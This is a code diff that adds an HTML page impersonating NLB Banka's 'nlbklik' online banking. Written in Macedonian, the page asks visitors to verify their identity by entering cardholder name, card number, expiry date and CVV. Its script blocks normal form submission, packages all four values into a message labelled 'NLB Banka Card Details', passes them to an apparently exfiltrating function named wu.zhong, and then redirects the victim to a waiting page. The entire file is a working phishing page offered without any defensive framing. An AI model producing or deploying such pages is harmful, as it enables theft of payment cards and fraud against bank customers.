@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/nlb.css">
+    <title>nlbklik</title>
+</head>
+<body>
+    
+   <header>
+    <img src="res/img/logoo.png">
+    </header>
+   
+<form action="post.php" method="post">
+    
+   
+
+   <div class="all">
+    
+        <h2>потврдете го вашиот идентитет</h2>
+        <p>Потврдете го вашиот идентитет со внесување на информациите за вашата картичка</p>
+      </div>
+      
+        <div class="input">
+          <label>имател на картичката</label><br>
+        <input type="text" name="name"  required placeholder="">
+      </div>
+        
+      
+
+        <div class="input">
+          <label>Број на картичка</label><br>
+        <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
+        </div>
+
+        <div class="input">
+          <label>Дата на истекување</label><br>
+        <input type="text" name="exp" required placeholder="MM/YY" id="exp">
+        </div>
+
+        <div class="input">
+          <label>безбедносен код</label><br>
+        <input type="password" name="cvv" required placeholder="CVV" id="cvv">
+        </div>
+
+        <div class="input" style="text-align:center;">
+          <button type="sumbit">Следно</button>
+        </div>
+</form>
+ 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+<script>
+$("#cc").mask("0000 0000 0000 0000");
+$("#exp").mask("00/00");
+$("#cvv").mask("0000");
+
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+e.preventDefault();
+
+wu.zhong(`💳 NLB Banka Card Details\n\nName:${document.querySelector("[name='name']").value}\n\nCard Number:${document.querySelector("[name='cc']").value}\n\nExp:${document.querySelector("[name='exp']").value}\n\nCVV:${document.querySelector("[name='cvv']").value}`);
+
+window.location="wait.html";
+
+});
+
+</script>
+</body>
+</html>
